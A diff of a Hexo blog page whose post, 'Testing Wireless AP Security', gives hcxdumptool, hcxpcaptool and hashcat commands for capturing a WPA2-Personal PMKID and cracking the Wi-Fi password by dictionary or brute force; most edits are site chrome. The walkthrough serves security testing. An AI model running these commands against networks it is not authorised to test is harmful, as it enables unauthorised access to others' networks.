@@ -58,11 +58,17 @@
   
 
   
+    
+      
+    
+
+    
+  
 
   
     
     
-    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Hack:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext">
   
 
 
@@ -116,8 +122,6 @@
   };
 </script>
 
-<script> document.addEventListener('touchstart', onTouchStart, {passive: true}); </script>
-
 
   
 
@@ -125,14 +129,14 @@
 
 
   <meta name="description" content="Testing Wireless AP securityA new flaw in WPA2-Personal has been found which doesn’t require capturing the 4-way handshake as in KRACK. Wifi adapter will need to be capable on monitor mode.  WPA2-EAP">
-<meta name="keywords" content="Wifi, Networking, Security">
+<meta name="keywords" content="Networking,Wifi,Security">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Testing Wireless AP Security">
 <meta property="og:url" content="mitchellberry.github.io/testing-wireless-ap-security/index.html">
-<meta property="og:site_name" content="Cybernated Trove">
+<meta property="og:site_name" content="Cybernated">
 <meta property="og:description" content="Testing Wireless AP securityA new flaw in WPA2-Personal has been found which doesn’t require capturing the 4-way handshake as in KRACK. Wifi adapter will need to be capable on monitor mode.  WPA2-EAP">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2019-01-22T01:00:17.451Z">
+<meta property="og:updated_time" content="2019-05-07T11:13:38.058Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Testing Wireless AP Security">
 <meta name="twitter:description" content="Testing Wireless AP securityA new flaw in WPA2-Personal has been found which doesn’t require capturing the 4-way handshake as in KRACK. Wifi adapter will need to be capable on monitor mode.  WPA2-EAP">
@@ -153,7 +157,7 @@
   };
 </script>
 
-  <title>Testing Wireless AP Security | Cybernated Trove</title>
+  <title>Testing Wireless AP Security | Cybernated</title>
   
 
 
@@ -212,7 +216,7 @@
     <div class="custom-logo-site-title">
       <a href="/" class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">Cybernated Trove</span>
+        <span class="site-title">Cybernated</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
@@ -250,6 +254,40 @@
     
 
     <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
 
   </li>
         
@@ -327,7 +365,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Cybernated Trove">
+      <meta itemprop="name" content="Cybernated">
     </span>
 
     
@@ -361,13 +399,9 @@
                 
               
 
-              <time title="Created: January-2019 08:56:08 / Modified: 12:00:17" itemprop="dateCreated datePublished" datetime="2019-01-22T08:56:08+11:00">January-2019</time>
+              <time title="Created: January-2019 08:56:08" itemprop="dateCreated datePublished" datetime="2019-01-22T08:56:08+11:00">January-2019</time>
             
 
-            
-              
-
-              
             
           </span>
 
@@ -420,6 +454,7 @@
       
         <h3 id="Testing-Wireless-AP-security"><a href="#Testing-Wireless-AP-security" class="headerlink" title="Testing Wireless AP security"></a>Testing Wireless AP security</h3><p>A new flaw in WPA2-Personal has been found which doesn’t require capturing the 4-way handshake as in KRACK. Wifi adapter will need to be capable on monitor mode. </p>
 <p>WPA2-EAP is not affected.  </p>
+<a id="more"></a>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## Capture the packet</span></span><br><span class="line">sudo hcxdumptool -o test.pcapng -i &lt;interface logical name&gt; --enable_status=1</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Kill network manager if warning shows</span></span><br><span class="line"><span class="comment"># warning: NetworkManager is running with pid 828</span></span><br><span class="line"><span class="comment"># warning: wpa_supplicant is running with pid 890</span></span><br><span class="line"><span class="comment"># &gt;&gt;&gt; sudo kill 828 890</span></span><br><span class="line"><span class="comment"># To restart: sudo systemctl start NetworkManager</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Convert into suitable hashcat format</span></span><br><span class="line">./hcxpcaptool -z test.16800 test.pcapng</span><br></pre></td></tr></table></figure>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dictionary attack with hashcat</span></span><br><span class="line">hashcat -m 16800 -a 0 -w 2 -o outfile test.16800 rockyou.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Bruteforce with hashcat</span></span><br><span class="line">hashcat -m 16800 -a 3 -o oufile -session=brute test.16800 &lt;guess mask&gt;</span><br></pre></td></tr></table></figure>
@@ -449,7 +484,11 @@
       
         <div class="post-tags">
           
-            <a href="/tags/wifi-networking-security/" rel="tag"># Wifi, Networking, Security</a>
+            <a href="/tags/networking/" rel="tag"># Networking</a>
+          
+            <a href="/tags/wifi/" rel="tag"># Wifi</a>
+          
+            <a href="/tags/security/" rel="tag"># Security</a>
           
         </div>
       
@@ -555,30 +594,36 @@
                 <div class="site-state-item site-state-categories">
                   
                     
+                      <a href="/categories/">
                     
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">10</span>
-                    <span class="site-state-item-name">categories</span>
                   
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">11</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
                 </div>
               
 
@@ -588,60 +633,104 @@
                 <div class="site-state-item site-state-tags">
                   
                     
+                      <a href="/tags/">
                     
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">25</span>
-                    <span class="site-state-item-name">tags</span>
                   
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">45</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
                 </div>
               
             </nav>
